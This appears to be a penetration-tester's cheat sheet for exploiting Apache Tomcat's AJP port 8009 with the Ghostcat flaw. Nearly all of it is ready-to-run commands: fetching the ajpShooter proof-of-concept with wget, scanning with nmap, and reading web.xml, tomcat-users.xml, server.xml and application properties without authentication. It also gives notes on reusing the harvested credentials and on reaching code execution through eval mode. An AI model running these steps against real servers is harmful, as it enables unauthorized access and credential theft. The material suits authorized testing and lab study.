# AJP - 8009

## Service Usage

AJP is a binary protocol — no plaintext client. Interact via Ghostcat PoC scripts.
Download the canonical ajpShooter PoC
```bash
wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
```

## 0. Fast Path (try these first)

Confirm AJP is open
```bash
nmap -p 8009 -sV $ip
```
Check for Ghostcat (file read via AJP)
```bash
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read
```
Syntax: `ajpShooter.py <url> <ajp_port> <file> <read|eval>`. `url` = Tomcat's HTTP URL, `8009` = AJP port, `read` mode prints the file.

## 1. Banner Grab & Unauthenticated Enumeration

Version and default-script scan
```bash
nmap -p 8009 -sV -sC $ip
```
AJP auth/headers/methods NSE scripts
```bash
nmap -p 8009 --script ajp-auth,ajp-headers,ajp-methods $ip
```

## 2. Authenticated Enumeration

Ghostcat gives file read without auth — use it to pull configs.
Read web.xml
```bash
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read
```
Read application.properties
```bash
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/classes/application.properties read
```
Read tomcat-users.xml
```bash
python3 ajpShooter.py http://$ip:8080 8009 /conf/tomcat-users.xml read
```
Read server.xml
```bash
python3 ajpShooter.py http://$ip:8080 8009 /conf/server.xml read
```

## 7. Post-Exploit / Pivot

- Ghostcat file read → grab configs/creds → reuse

### Common gotchas
```text
- Vulnerable Tomcat: < 9.0.31, < 8.5.51, < 7.0.100 (patched versions enforce requiredSecret).
- Ghostcat = local file read (LFI), NOT direct remote file include (RFI). RCE needs an upload primitive.
- Use eval mode only if you already uploaded a JSP-as-other-extension file.
- The `url` arg is Tomcat's HTTP port (e.g., 8080), NOT the AJP port. AJP port is the separate arg.
- Note: other ghostcat.py PoCs exist with DIFFERENT syntax — ajpShooter.py is the canonical/reference one.
- AJP is Tomcat's hidden backdoor — if 8009 is open, this is likely the intended path.
```
